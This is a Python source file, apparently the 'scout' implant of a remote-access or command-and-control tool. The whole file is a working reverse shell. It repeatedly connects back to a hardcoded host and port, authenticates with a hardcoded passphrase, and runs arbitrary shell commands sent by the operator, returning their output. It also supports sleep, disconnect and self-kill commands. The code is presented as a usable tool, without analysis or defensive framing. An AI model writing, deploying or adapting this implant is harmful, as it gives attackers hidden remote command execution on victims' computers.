import socket
from os import chdir, _exit
from time import sleep
from subprocess import Popen, PIPE

help_menu = '''
Scout Help Menu
===============
   Base Commands :
      disconnect               Disconnects the scout
      help                     Show the help menu or help for specific command, alias of the command is "?"
      kill                     Kills the scout
      ping                     Ping the scout
      sleep                    Make the scout disconnect and sleep for a specified amount of time

   Scout Commands :
      exec_c <shell command>   A remote shell command execution component of the scout, it allows the scout to remotely execute commands using cmd.exe
'''

def exec_c(execute):
    execute = execute.split(' ',1)[1]
    if execute[:3] == 'cd ':
        execute = execute.replace('cd ', '', 1)
        chdir(execute)
        send_all(s,"[+]Changed to directory : " + execute)
    else:
        result = Popen(execute, shell=True, stdout=PIPE, stderr=PIPE,
                       stdin=PIPE)
        result = result.stdout.read() + result.stderr.read()        
        send_all(s,'[+]Command output : \n' + result.decode())

def recv_all(sock):
    sock.settimeout(None)
    try:
        data = sock.recv(1000000)
        processed_data = data.decode()
        target_length = int(processed_data.split("|",1)[0]) 
        data = data[len(str(target_length))+1:] 
    except UnicodeDecodeError:
        target_length = int(data.decode(encoding='utf-8', errors='ignore').split("|",1)[0])
        data = data[len(str(target_length))+1:] 
    received_data_length = len(data) 
    if received_data_length >= target_length: 
        try:
            return data.decode()
        except UnicodeDecodeError:
            return data
    sock.settimeout(3) 
    while received_data_length < target_length: 
        try:
            tmp_data = sock.recv(1000000)
            if not tmp_data:
                raise socket.error
            data += tmp_data
            received_data_length += 1000000
        except (socket.error, socket.timeout):
            break
    try:
        return data.decode()
    except UnicodeDecodeError:
        return data
def send_all(sock, data):
    try:
        sock.sendall((str(len(data)) + "|" + data).encode())
    except TypeError:
        sock.sendall(str(len(data)).encode() + b"|" + data)
host_list = ['192.168.61.133']
while True:
    connected = False
    while True:
        for i in host_list:
            try:
                s = socket.socket()
                s.settimeout(5)
                s.connect((i,9999))
                send_all(s,'4yVJmsNN3#FpVJi6s8!yPKdhWqQK1SSoer8XQWUsEh7*Yq^Pup')
                connected = True
                break
            except (socket.timeout,socket.error):
                continue
        if connected:
            break
    while True:
        try:
            data = recv_all(s)
            command = data.split(' ',1)[0]
            if command == 'kill':
                send_all(s,'[*]Scout is killing itself...')
                _exit(1)
            elif command in ('help','?'):
                send_all(s,help_menu)
            elif command == 'ping':
                send_all(s,'[+]Scout is alive')
            elif command == 'sleep':
                length = int(data.split(' ',1)[1])
                send_all(s,'[*]Scout is sleeping...')
                for i in range(length):
                    sleep(1)
                break
            elif command == 'disconnect':
                send_all(s,'[*]Scout is disconnecting itself...')
                sleep(3)
                break
            elif command == "exec_c":
                exec_c(data)
            else:
                send_all(s,'[-]Scout does not have the capability to run this command. (Was it loaded during generation?)')
        except (socket.error,socket.timeout) as e:
            try:
                if type(e) not in (socket.error,socket.timeout):
                    raise e
                s.close()
                break
            except IndexError:
                send_all(s,'[-]Please supply valid arguments for the command you are running')
            except Exception as e:
                send_all(s,'[!]Error in scout : ' + str(e))
        except IndexError:
            send_all(s,'[-]Please supply valid arguments for the command you are running')
        except Exception as e:
            send_all(s,'[!]Error in scout : ' + str(e))